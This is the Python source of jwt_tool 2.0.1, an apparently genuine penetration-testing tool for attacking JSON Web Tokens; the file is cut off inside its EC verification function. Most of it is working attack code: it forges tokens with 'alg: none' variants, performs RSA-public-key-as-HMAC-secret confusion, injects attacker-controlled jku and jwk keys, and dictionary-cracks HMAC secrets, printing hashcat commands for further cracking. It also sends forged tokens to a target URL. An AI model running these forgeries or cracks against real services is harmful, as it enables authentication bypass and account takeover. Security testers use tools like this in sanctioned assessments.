#!/usr/bin/env python3
#
# JWT_Tool version 2.0.1 (25_10_2020)
# Written by Andy Tyler (@ticarpi)
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi
 
# from exploits import *
# from constructor import *
# from tamper import *
# from reporting import *
# import scanconfigs
import ssl
import sys
import os
import re
import hashlib
import hmac
import base64
import json
import random
import argparse
from datetime import datetime
import configparser
from http.cookies import SimpleCookie
from collections import OrderedDict
try:
    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
    from Cryptodome.Hash import SHA256, SHA384, SHA512
    from Cryptodome.PublicKey import RSA, ECC
except:
    print("WARNING: Cryptodome libraries not imported - these are needed for asymmetric crypto signing and verifying")
    print("On most Linux systems you can run the following command to install:")
    print("pip3 install pycryptodomex\n")
try:
    from termcolor import cprint
except:
    print("WARNING: termcolor library is not imported - this is used to make the output clearer and oh so pretty")
    print("On most Linux systems you can run the following command to install:")
    print("pip3 install termcolor\n")
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    print("WARNING: Python Requests libraries not imported - these are needed for external service interaction")
    print("On most Linux systems you can run the following command to install:")
    print("pip3 install requests\n")

def createConfig():
    # gen RSA keypair
    pubKey, privKey = newRSAKeyPair()
    privKeyName = "jwttool_custom_private_RSA.pem"
    with open(privKeyName, 'w') as test_priv_out:
        test_priv_out.write(privKey.decode())
    pubkeyName = "jwttool_custom_public_RSA.pem"
    with open(pubkeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey.decode())
    # gen EC keypair
    ecpubKey, ecprivKey = newECKeyPair()
    ecprivKeyName = "jwttool_custom_private_EC.pem"
    with open(ecprivKeyName, 'w') as ectest_priv_out:
        ectest_priv_out.write(ecprivKey)
    ecpubkeyName = "jwttool_custom_public_EC.pem"
    with open(ecpubkeyName, 'w') as ectest_pub_out:
        ectest_pub_out.write(ecpubKey)
    # gen jwks
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    jwksbuild = buildJWKS(n, e, "jwt_tool")
    jwksout = {"keys": []}
    jwksout["keys"].append(jwksbuild)
    fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
    jwksName = "jwttool_custom_jwks.json"
    with open(jwksName, 'w') as test_jwks_out:
            test_jwks_out.write(fulljwks)
    config = configparser.ConfigParser(allow_no_value=True)
    config['crypto'] = {'pubkey': pubkeyName,
        'privkey': privKeyName,
        'ecpubkey': ecpubkeyName,
        'ecprivkey': ecprivKeyName,
        'jwks': jwksName}
    config['services'] = {'jwt_tool_version': '2.0.1',
        '# To disable the proxy option set this value to False (no quotes)': None, 'proxy': 'localhost:8080',
        '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe a cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,
        'jwksloc': '',
        '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}
    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
        'jwks_kid': 'jwt_tool' }
    config['input'] = {'wordlist': 'jwt-common.txt'}
    config['argvals'] = {'# Set at runtime - changes here are ignored': None,
        'sigType': '',
        'targetUrl': '',
        'cookies': '',
        'key': '',
        'keyList': '',
        'keyFile': '',
        'headerLoc': '',
        'payloadclaim': '',
        'headerclaim': '',
        'payloadvalue': '',
        'headervalue': '',
        'canaryvalue': '',
        'header': '',
        'exploitType': '',
        'scanMode': '',
        'reqMode': '',
        'postData': '',
        'resCode': '',
        'resSize': '',
        'resContent': ''}
    with open(configFileName, 'w') as configfile:
        config.write(configfile)
    cprint("Configuration file built - review contents of \"jwtconf.ini\" to customise your options.", "cyan")
    cprint("Make sure to set the \"jwkloc\" value to a URL you can store your custom JWKS file at for best results.", "cyan")
    exit(1)

def sendToken(token, cookiedict, track, headertoken=""):
    url = config['argvals']['targetUrl']
    headers = {'User-agent': config['customising']['useragent']+" "+track}
    if headertoken:
        headerName, headerVal = headertoken.split(":")
        headers[headerName] = headerVal.lstrip(" ")
    try:
        if config['services']['proxy'] == "False":
            if config['argvals']['postData']:
                response = requests.post(url, data=config['argvals']['postData'], headers=headers, cookies=cookiedict, proxies=False, verify=False)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False)
        else:
            proxies = {'http': 'http://'+config['services']['proxy'], 'https': 'http://'+config['services']['proxy']}
            if config['argvals']['postData']:
                response = requests.post(url, data=config['argvals']['postData'], headers=headers, cookies=cookiedict, proxies=proxies, verify=False)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False)
            
        return [response.status_code, len(response.content), response.content]
    except requests.exceptions.ProxyError as err:
        cprint("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n"+str(err), "red")
        exit(1)

def parse_dict_cookies(value):
    cookiedict = {}
    for item in value.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' not in item:
            cookiedict[item] = None
            continue
        name, value = item.split('=', 1)
        cookiedict[name] = value
    return cookiedict

def strip_dict_cookies(value):
    cookiestring = ""
    for item in value.split(';'):
        if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', item):
            continue
        else:
            cookiestring += "; "+item
        cookiestring = cookiestring.lstrip("; ")
    return cookiestring

def jwtOut(token, fromMod, desc=""):
    genTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    idFrag = genTime+str(token)
    logID = "jwttool_"+hashlib.md5(idFrag.encode()).hexdigest()
    if config['argvals']['targetUrl'] != "":
        curTargetUrl = config['argvals']['targetUrl']
        p = re.compile('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*')
        if config['argvals']['headerloc'] == "cookies":
            cookietoken = p.subn(token, config['argvals']['cookies'], 0)
        else:
            cookietoken = [config['argvals']['cookies'],0]
        if config['argvals']['headerloc'] == "headers":
            headertoken = p.subn(token, config['argvals']['header'], 0)
        else:
            headertoken = [config['argvals']['header'],0]
        try:
            cookiedict = parse_dict_cookies(cookietoken[0])
        except:
            cookiedict = {}
        # Check if token was included in substitution 
        if cookietoken[1] == 1 or headertoken[1] == 1:
            resData = sendToken(token, cookiedict, logID, headertoken[0])
        else:
            if config['argvals']['overridesub'] == "true":
                resData = sendToken(token, cookiedict, logID, headertoken[0])
            else:
                cprint("[-] No substitution occurred - check that a token is included in a cookie/header in the request", "red")
                cprint(headertoken, cookietoken, "cyan")
                exit(1)
        if config['argvals']['canaryvalue']:
            if config['argvals']['canaryvalue'] in str(resData[2]):
                cprint("[+] FOUND \""+config['argvals']['canaryvalue']+"\" in response:\n"+logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            else:
                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
        else:
            if 200 <= resData[0] < 300:
                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            elif 300 <= resData[0] < 400:
                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
            elif 400 <= resData[0] < 600:
                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "red")
    else:
        if desc != "":
            cprint(logID+" - "+desc, "cyan")
        cprint("[+] "+token, "green")
        curTargetUrl = "Not sent"
    additional = "[Commandline request: "+' '.join(sys.argv[0:])+']'
    setLog(token, genTime, logID, fromMod, curTargetUrl, additional)
    try:
        config['argvals']['rescode'],config['argvals']['ressize'],config['argvals']['rescontent'] = str(resData[0]),str(resData[1]),str(resData[2])
    except:
        pass

def setLog(jwt, genTime, logID, modulename, targetURL, additional):
    logLine = genTime+" | "+modulename+" | "+targetURL+" | "+additional
    with open(logFilename, 'a') as logFile:
        logFile.write(logID+" - "+logLine+" - "+jwt+"\n")
    return logID

def buildHead(alg, headDict):
    newHead = headDict
    newHead["alg"] = alg
    newHead = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newHead

def checkAlgNone(headDict, paylB64):
    alg1 = "none"
    newHead1 = buildHead(alg1, headDict)
    CVEToken0 = newHead1+"."+paylB64+"."
    alg = "None"
    newHead = buildHead(alg, headDict)
    CVEToken1 = newHead+"."+paylB64+"."
    alg = "NONE"
    newHead = buildHead(alg, headDict)
    CVEToken2 = newHead+"."+paylB64+"."
    alg = "nOnE"
    newHead = buildHead(alg, headDict)
    CVEToken3 = newHead+"."+paylB64+"."
    return [CVEToken0, CVEToken1, CVEToken2, CVEToken3]

def checkPubKeyExploit(headDict, paylB64, pubKey):
    try:
        key = open(pubKey).read()
        cprint("File loaded: "+pubKey, "cyan")
    except:
        cprint("[-] File not found", "red")
        exit(1)
    newHead = headDict
    newHead["alg"] = "HS256"
    newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newTok = newHead+"."+paylB64
    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newTok, newSig

def injectpayloadclaim(payloadclaim, injectionvalue):
    newpaylDict = paylDict
    # print(paylDict)
    # print(newpaylDict)
    newpaylDict[payloadclaim] = castInput(injectionvalue)
    newPaylB64 = base64.urlsafe_b64encode(json.dumps(newpaylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newpaylDict, newPaylB64

def injectheaderclaim(headerclaim, injectionvalue):
    newheadDict = headDict
    newheadDict[headerclaim] = castInput(injectionvalue)
    newHeadB64 = base64.urlsafe_b64encode(json.dumps(newheadDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newheadDict, newHeadB64

def tamperToken(paylDict, headDict, sig):
    print("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================")
    print("\nToken header values:")
    while True:
        i = 0
        headList = [0]
        for pair in headDict:
            menuNum = i+1
            if isinstance(headDict[pair], dict):
                cprint("["+str(menuNum)+"] "+pair+" = JSON object:", "green")
                for subclaim in headDict[pair]:
                    cprint("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]), "green")
            else:
                if type(headDict[pair]) == str:
                    cprint("["+str(menuNum)+"] "+pair+" = \""+str(headDict[pair])+"\"", "green")
                else:
                    cprint("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "green")
            headList.append(pair)
            i += 1
        print("["+str(i+1)+"] *ADD A VALUE*")
        print("["+str(i+2)+"] *DELETE A VALUE*")
        print("[0] Continue to next step")
        selection = ""
        print("\nPlease select a field number:\n(or 0 to Continue)")
        try:
            selection = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selection<len(headList) and selection>0:
            if isinstance(headDict[headList[selection]], dict):
                print("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)")
                newVal = OrderedDict()
                for subclaim in headDict[headList[selection]]:
                    newVal[subclaim] = headDict[pair][subclaim]
                newVal = buildSubclaim(newVal, headList, selection)
                headDict[headList[selection]] = newVal
            else:
                print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
                print("Please enter new value and hit ENTER")
                newVal = input("> ")
            headDict[headList[selection]] = castInput(newVal)
        elif selection == i+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newInput = input("> ")
            headList.append(newPair)
            headDict[headList[selection]] = castInput(newInput)
        elif selection == i+2:
            print("Please select a Key to DELETE and hit ENTER")
            i = 0
            for pair in headDict:
                menuNum = i+1
                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
                headList.append(pair)
                i += 1
            try:
                delPair = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            del headDict[headList[delPair]]
        elif selection == 0:
            break
        else:
            exit(1)
    print("\nToken payload values:")
    while True:
        comparestamps, expiredtoken = dissectPayl(paylDict, count=True)
        i = 0
        paylList = [0]
        for pair in paylDict:
            menuNum = i+1
            paylList.append(pair)
            i += 1
        print("["+str(i+1)+"] *ADD A VALUE*")
        print("["+str(i+2)+"] *DELETE A VALUE*")
        if len(comparestamps) > 0:
            print("["+str(i+3)+"] *UPDATE TIMESTAMPS*")
        print("[0] Continue to next step")
        selection = ""
        print("\nPlease select a field number:\n(or 0 to Continue)")
        try:
            selection = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if selection<len(paylList) and selection>0:
            if isinstance(paylDict[paylList[selection]], dict):
                print("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)")
                newVal = OrderedDict()
                for subclaim in paylDict[paylList[selection]]:
                    print(subclaim)
                    newVal[subclaim] = paylDict[pair][subclaim]
                newVal = buildSubclaim(newVal, paylList, selection)
                paylDict[paylList[selection]] = newVal
            else:
                print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
                print("Please enter new value and hit ENTER")
                newVal = input("> ")
                paylDict[paylList[selection]] = castInput(newVal)
        elif selection == i+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newVal = input("> ")
            try:
                newVal = int(newVal)
            except:
                pass
            paylList.append(newPair)
            paylDict[paylList[selection]] = castInput(newVal)
        elif selection == i+2:
            print("Please select a Key to DELETE and hit ENTER")
            i = 0
            for pair in paylDict:
                menuNum = i+1
                print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
                paylList.append(pair)
                i += 1
            delPair = eval(input("> "))
            del paylDict[paylList[delPair]]
        elif selection == i+3:
            print("Timestamp updating:")
            print("[1] Update earliest timestamp to current time (keeping offsets)")
            print("[2] Add 1 hour to timestamps")
            print("[3] Add 1 day to timestamps")
            print("[4] Remove 1 hour from timestamps")
            print("[5] Remove 1 day from timestamps")
            print("\nPlease select an option from above (1-5):")
            try:
                selection = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            if selection == 1:
                nowtime = int(datetime.now().timestamp())
                timecomp = {}
                for timestamp in comparestamps:
                    timecomp[timestamp] = paylDict[timestamp]
                earliest = min(timecomp, key=timecomp.get)
                earlytime = paylDict[earliest]
                for timestamp in comparestamps:
                    if timestamp == earliest:
                        paylDict[timestamp] = nowtime
                    else:
                        difftime = int(paylDict[timestamp])-int(earlytime)
                        paylDict[timestamp] = nowtime+difftime
            elif selection == 2:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+3600
                    paylDict[timestamp] = newVal
            elif selection == 3:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+86400
                    paylDict[timestamp] = newVal
            elif selection == 4:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-3600
                    paylDict[timestamp] = newVal
            elif selection == 5:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-86400
                    paylDict[timestamp] = newVal
            else:
                print("Invalid selection")
                exit(1)
        elif selection == 0:
            break
        else:
            exit(1)
    if config['argvals']['sigType'] == "" and config['argvals']['exploitType'] == "":
        cprint("Signature unchanged - no signing method specified (-S or -X)", "cyan")
        newContents = genContents(headDict, paylDict)
        desc = "Tampered token:"
        jwtOut(newContents+"."+sig, "Manual Tamper - original signature", desc)
    elif config['argvals']['exploitType'] != "":
        runExploits()
    elif config['argvals']['sigType'] != "":
        signingToken(headDict, paylDict)

def signingToken(newheadDict, newpaylDict):
    if config['argvals']['sigType'][0:2] == "hs":
        key = ""
        if args.password:
            key = config['argvals']['key']
        elif args.keyfile:
            key = open(config['argvals']['keyFile']).read()
        newSig, newContents = signTokenHS(newheadDict, newpaylDict, key, int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - HMAC Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - HMAC Signing", desc)
    elif config['argvals']['sigType'][0:2] == "rs":
        newSig, newContents = signTokenRSA(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - RSA Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - RSA Signing", desc)
    elif config['argvals']['sigType'][0:2] == "ec":
        newSig, newContents = signTokenEC(newheadDict, newpaylDict, config['crypto']['ecprivkey'], int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - EC Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - EC Signing", desc)
    elif config['argvals']['sigType'][0:2] == "ps":
        newSig, newContents = signTokenPSS(newheadDict, newpaylDict, config['crypto']['privkey'], int(config['argvals']['sigType'][2:]))
        desc = "Tampered token - PSS RSA Signing:"
        jwtOut(newContents+"."+newSig, "Manual Tamper - PSS RSA Signing", desc)

def checkSig(sig, contents, key):
    quiet = False
    if key == "":
        print("Type in the key to test")
        key = input("> ")
    testKey(key.encode(), sig, contents, headDict, quiet)

def checkSigKid(sig, contents):
    quiet = False
    print("\nLoading key file...")
    try:
        key1 = open(config['argvals']['keyFile']).read()
        cprint("File loaded: "+config['argvals']['keyFile'], "cyan")
        testKey(key1.encode(), sig, contents, headDict, quiet)
    except:
        cprint("Could not load key file", "red")
        exit(1)

def crackSig(sig, contents):
    quiet = True
    if headDict["alg"][0:2] != "HS":
        print("Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.")
        return
    # print("\nLoading key dictionary...")
    try:
        # cprint("File loaded: "+config['argvals']['keyList'], "cyan")
        keyLst = open(config['argvals']['keyList'], "r", encoding='utf-8', errors='ignore')
        nextKey = keyLst.readline()
    except:
        cprint("No dictionary file loaded", "red")
        exit(1)
    # print("Testing passwords in dictionary...")
    utf8errors = 0
    wordcount = 0
    while nextKey:
        wordcount += 1
        try:
            cracked = testKey(nextKey.strip().encode('UTF-8'), sig, contents, headDict, quiet)
        except:
            cracked = False
        if not cracked:
            if wordcount % 1000000 == 0:
                cprint("[*] Tested "+str(int(wordcount/1000000))+" million passwords so far", "cyan")
            try:
                nextKey = keyLst.readline()
            except:
                utf8errors  += 1
                nextKey = keyLst.readline()
        else:
            return
    if cracked == False:
        cprint("[-] Key not in dictionary", "red")
        if not args.mode:
            cprint("\n===============================\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n===============================\n", "cyan")
    if utf8errors > 0:
        cprint(utf8errors, " UTF-8 incompatible passwords skipped", "cyan")

def castInput(newInput):
    if "{" in newInput:
        try:
            jsonInput = json.loads(newInput)
            return jsonInput
        except ValueError:
            pass
    if "\"" in newInput:
        return newInput.strip("\"")
    elif newInput == "True" or newInput == "true":
        return True
    elif newInput == "False" or newInput == "false":
        return False
    elif newInput == "null":
        return None
    else:
        try:
            numInput = float(newInput)
            try:
                intInput = int(newInput)
                return intInput
            except:
                return numInput
        except:
            return str(newInput)
    return newInput

def buildSubclaim(newVal, claimList, selection):
    while True:
        subList = [0]
        s = 0
        for subclaim in newVal:
            subNum = s+1
            print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
            s += 1
            subList.append(subclaim)
        print("["+str(s+1)+"] *ADD A VALUE*")
        print("["+str(s+2)+"] *DELETE A VALUE*")
        print("[0] Continue to next step")
        try:
            subSel = int(input("> "))
        except:
            print("Invalid selection")
            exit(1)
        if subSel<=len(newVal) and subSel>0:
            selClaim = subList[subSel]
            print("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]))
            print("Please enter new value and hit ENTER")
            newVal[selClaim] = castInput(input("> "))
            print()
        elif subSel == s+1:
            print("Please enter new Key and hit ENTER")
            newPair = input("> ")
            print("Please enter new value for "+newPair+" and hit ENTER")
            newVal[newPair] = castInput(input("> "))
        elif subSel == s+2:
            print("Please select a Key to DELETE and hit ENTER")
            s = 0
            for subclaim in newVal:
                subNum = s+1
                print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
                subList.append(subclaim)
                s += 1
            try:
                selSub = int(input("> "))
            except:
                print("Invalid selection")
                exit(1)
            delSub = subList[selSub]
            del newVal[delSub]
        elif subSel == 0:
            return newVal

def testKey(key, sig, contents, headDict, quiet):
    if headDict["alg"] == "HS256":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha256).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS384":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS512":
        testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        print("Algorithm is not HMAC-SHA - cannot test with this tool.")
        exit(1)
    if testSig == sig:
        cracked = True
        if len(key) > 25:
            cprint("[+] CORRECT key found:\n"+key.decode('UTF-8'), "green")
        else:
            cprint("[+] "+key.decode('UTF-8')+" is the CORRECT key!", "green")
        return cracked
    else:
        cracked = False
        if quiet == False:
            if len(key) > 25:
                cprint("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key", "red")
            else:
                cprint("[-] "+key.decode('UTF-8')+" is not the correct key", "red")
        return cracked

def getRSAKeyPair():
    #config['crypto']['pubkey'] = config['crypto']['pubkey']
    privkey = config['crypto']['privkey']
    cprint("key: "+privkey, "cyan")
    privKey = RSA.importKey(open(privkey).read())
    pubKey = privKey.publickey().exportKey("PEM")
    #config['crypto']['pubkey'] = RSA.importKey(config['crypto']['pubkey'])
    return pubKey, privKey

def newRSAKeyPair():
    new_key = RSA.generate(2048, e=65537)
    pubKey = new_key.publickey().exportKey("PEM")
    privKey = new_key.exportKey("PEM")
    return pubKey, privKey

def newECKeyPair():
    new_key = ECC.generate(curve='P-256')
    pubkey = new_key.public_key().export_key(format="PEM")
    privKey = new_key.export_key(format="PEM")
    return pubkey, privKey

def signTokenHS(headDict, paylDict, key, hashLength):
    newHead = headDict
    newHead["alg"] = "HS"+str(hashLength)
    if hashLength == 384:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif hashLength == 512:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        newContents = genContents(newHead, paylDict)
        newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newSig, newContents

def buildJWKS(n, e, kid):                                       
    newjwks = {}
    newjwks["kty"] = "RSA"
    newjwks["kid"] = kid
    newjwks["use"] = "sig"
    newjwks["e"] = str(e.decode('UTF-8'))
    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
    return newjwks

def jwksGen(headDict, paylDict, jku, privKey, kid="jwt_tool"):
    newHead = headDict
    nowtime = str(int(datetime.now().timestamp()))
    key = RSA.importKey(open(config['crypto']['privkey']).read())
    pubKey = key.publickey().exportKey("PEM")
    privKey = key.export_key(format="PEM")
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    privKeyName = config['crypto']['privkey']
    newjwks = buildJWKS(n, e, kid)
    newHead["jku"] = jku
    newHead["alg"] = "RS256"
    key = RSA.importKey(privKey)
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        print("Invalid Private Key")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
    jwksbuild = {"keys": []}
    jwksbuild["keys"].append(newjwks)
    fulljwks = json.dumps(jwksbuild,separators=(",",":"), indent=4)
    if config['crypto']['jwks'] == "":
        jwksName = "jwks_jwttool_RSA_"+nowtime+".json"
        with open(jwksName, 'w') as test_jwks_out:
                test_jwks_out.write(fulljwks)
    else:
        jwksName = config['crypto']['jwks']
    return newSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName, fulljwks

def jwksEmbed(newheadDict, newpaylDict):
    newHead = newheadDict
    pubKey, privKey = getRSAKeyPair()
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    newjwks = buildJWKS(n, e, "jwt_tool")
    newHead["jwk"] = newjwks
    newHead["alg"] = "RS256"
    key = privKey
    # key = RSA.importKey(privKey)
    newContents = genContents(newHead, newpaylDict)
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprint("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def signTokenRSA(headDict, paylDict, privKey, hashLength):
    newHead = headDict
    newHead["alg"] = "RS"+str(hashLength)
    key = RSA.importKey(open(config['crypto']['privkey']).read())
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    if hashLength == 256:
        h = SHA256.new(newContents)
    elif hashLength == 384:
        h = SHA384.new(newContents)
    elif hashLength == 512:
        h = SHA512.new(newContents)
    else:
        cprint("Invalid RSA hash length", "red")
        exit(1)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprint("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def signTokenEC(headDict, paylDict, privKey, hashLength):
    newHead = headDict
    newHead["alg"] = "ES"+str(hashLength)
    key = ECC.import_key(open(config['crypto']['ecprivkey']).read())
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    if hashLength == 256:
        h = SHA256.new(newContents)
    elif hashLength == 384:
        h = SHA384.new(newContents)
    elif hashLength == 512:
        h = SHA512.new(newContents)
    else:
        cprint("Invalid hash length", "red")
        exit(1)
    signer = DSS.new(key, 'fips-186-3')
    try:
        signature = signer.sign(h)
    except:
        cprint("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def signTokenPSS(headDict, paylDict, privKey, hashLength):
    newHead = headDict
    newHead["alg"] = "PS"+str(hashLength)
    key = RSA.importKey(open(config['crypto']['privkey']).read())
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')
    if hashLength == 256:
        h = SHA256.new(newContents)
    elif hashLength == 384:
        h = SHA384.new(newContents)
    elif hashLength == 512:
        h = SHA512.new(newContents)
    else:
        cprint("Invalid RSA hash length", "red")
        exit(1)
    try:
        signature = pss.new(key).sign(h)
    except:
        cprint("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')

def verifyTokenRSA(headDict, paylDict, sig, pubKey):
    key = RSA.importKey(open(pubKey).read())
    newContents = genContents(headDict, paylDict)
    newContents = newContents.encode('UTF-8')
    if "-" in sig:
        try:
            sig = base64.urlsafe_b64decode(sig)
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"==")
        except:
            pass
    elif "+" in sig:
        try:
            sig = base64.b64decode(sig)
        except:
            pass
        try:
            sig = base64.b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.b64decode(sig+"==")
        except:
            pass
    else:
        cprint("Signature not Base64 encoded HEX", "red")
    if headDict['alg'] == "RS256":
        h = SHA256.new(newContents)
    elif headDict['alg'] == "RS384":
        h = SHA384.new(newContents)
    elif headDict['alg'] == "RS512":
        h = SHA512.new(newContents)
    else:
        cprint("Invalid RSA algorithm", "red")
    verifier = PKCS1_v1_5.new(key)
    try:
        valid = verifier.verify(h, sig)
        if valid:
            cprint("RSA Signature is VALID", "green")
            valid = True
        else:
            cprint("RSA Signature is INVALID", "red")
            valid = False
    except:
        cprint("The Public Key is invalid", "red")
    return valid

def verifyTokenEC(headDict, paylDict, sig, pubKey):
    newContents = genContents(headDict, paylDict)
    message = newContents.encode('UTF-8')
    if "-" in str(sig):
        try:
            signature = base64.urlsafe_b64decode(sig)
        except:
            pass
        try:
            signature = base64.urlsafe_b64decode(sig+"=")
        except:
            pass
        try:
            signature = base64.urlsafe_b64decode(sig+"==")
        except:
            pass
    elif "+" in str(sig):
        try:
            signature = base64.b64decode(sig)
        except:
            pass
        try:
            signature = base64.b64decode(sig+"=")
        except:
            pass
        try:
            signature = base64.b64decode(sig+"==")
        except:
            pass
    else:
        cprint("Signature not Base64 encoded HEX", "red")
    if headDict['alg'] == "ES256":
        h = SHA256.new(message)
